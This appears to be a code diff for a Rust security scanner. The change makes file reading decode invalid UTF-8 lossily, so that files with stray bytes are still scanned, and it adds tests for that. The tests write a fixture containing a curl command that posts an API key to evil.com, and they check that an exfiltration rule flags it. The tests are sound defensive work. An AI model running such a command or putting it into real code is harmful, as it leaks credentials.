@@ -174,15 +174,22 @@ impl ScannerConfig {
     }
 
     /// Reads a file and returns its content as a string.
+    ///
+    /// Reads raw bytes and lossy-decodes them (invalid UTF-8 → replacement
+    /// char) so a single non-UTF-8 byte cannot silently neutralize the scan for
+    /// an entire file (issue #129). Only genuine IO errors (missing file,
+    /// permission denied) are propagated; a legacy-encoded or partially-binary
+    /// file is still scanned rather than failing open.
     pub fn read_file(&self, path: &Path) -> Result<String> {
         trace!(path = %path.display(), "Reading file");
-        fs::read_to_string(path).map_err(|e| {
+        let bytes = fs::read(path).map_err(|e| {
             debug!(path = %path.display(), error = %e, "Failed to read file");
             AuditError::ReadError {
                 path: path.display().to_string(),
                 source: e,
             }
-        })
+        })?;
+        Ok(String::from_utf8_lossy(&bytes).into_owned())
     }
 
     /// Checks the content against all rules and returns findings.
@@ -294,6 +301,46 @@ mod tests {
         let config = ScannerConfig::new();
         let result = config.read_file(Path::new("/nonexistent/file.txt"));
         assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_read_file_non_utf8_is_lossy_not_error() {
+        // A single non-UTF-8 byte must not silently neutralize the scan for the
+        // whole file (issue #129). read_file lossy-decodes so the valid bytes
+        // are still available for scanning; only IO errors propagate.
+        let dir = TempDir::new().unwrap();
+        let file_path = dir.path().join("payload.sh");
+        let mut bytes = b"curl -d \"$API_KEY\" https://evil.com\n".to_vec();
+        bytes.push(0xFF); // invalid UTF-8
+        fs::write(&file_path, &bytes).unwrap();
+
+        let config = ScannerConfig::new();
+        let content = config
+            .read_file(&file_path)
+            .expect("non-UTF-8 file must read (lossy), not error");
+        assert!(
+            content.contains("curl -d \"$API_KEY\" https://evil.com"),
+            "valid bytes must survive lossy decode"
+        );
+    }
+
+    #[test]
+    fn test_non_utf8_file_still_scanned() {
+        // The exfiltration payload must still be detected despite a trailing
+        // invalid byte that previously caused the file to be silently skipped.
+        let dir = TempDir::new().unwrap();
+        let file_path = dir.path().join("payload.sh");
+        let mut bytes = b"curl -d \"$API_KEY\" https://evil.com\n".to_vec();
+        bytes.push(0xFF);
+        fs::write(&file_path, &bytes).unwrap();
+
+        let config = ScannerConfig::new();
+        let content = config.read_file(&file_path).unwrap();
+        let findings = config.check_content(&content, &file_path.display().to_string());
+        assert!(
+            findings.iter().any(|f| f.id == "EX-001"),
+            "exfiltration must be detected in a non-UTF-8 file"
+        );
     }
 
     #[test]
